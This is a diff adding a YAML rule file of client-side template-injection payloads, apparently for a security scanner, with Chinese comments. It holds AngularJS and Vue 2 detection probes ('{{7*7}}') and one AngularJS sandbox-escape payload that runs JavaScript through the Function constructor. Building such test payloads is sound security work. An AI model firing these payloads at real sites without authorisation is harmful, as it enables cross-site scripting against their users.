@@ -1,0 +1,55 @@
+ruleDB: v0.1.0
+# **客户端**模板 / 表达式注入。
+#
+# 与服务端 SSTI 的区别：模板在**浏览器**里编译，所以效果是任意 JS 执行（等价于 XSS），
+# 不是命令执行。触发条件是页面用了客户端模板且用户输入会进到模板源码里
+# （比如 `new Vue({template: 用户输入})`，或 AngularJS 的 ng-app 把 DOM 当模板编译）。
+#
+# 这类只收**检测可靠的**载荷。Vue 2 的沙箱逃逸在各版本间差异大，没有一条能通吃的载荷，
+# 所以只给探测，不给利用——见方案 §A.3 修订说明。
+
+templates:
+  - id: ssti.client.angularjs.detect
+    name: AngularJS 表达式探测
+    desc: ng-app 会把 DOM 当模板编译，{{7*7}} 输出 49 说明存在表达式注入
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [angularjs]
+    version: "<1.6"
+    body: "{{7*7}}"
+    vars: []
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.client.angularjs.escape
+    name: AngularJS 沙箱逃逸
+    desc: 经 constructor 拿回 Function 构造器。1.6 起移除了沙箱表达式，这条会失效
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [angularjs]
+    version: "<1.6"
+    body: "{{constructor.constructor('alert(1)')()}}"
+    vars: []
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.client.vue2.detect
+    name: Vue 客户端模板探测
+    desc: 只有当用户输入进到 template 选项（而非数据）时才会被编译。只给探测——各版本的沙箱差异大，没有通吃的逃逸载荷
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [vue]
+    version: "<3.0"
+    body: "{{7*7}}"
+    vars: []
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
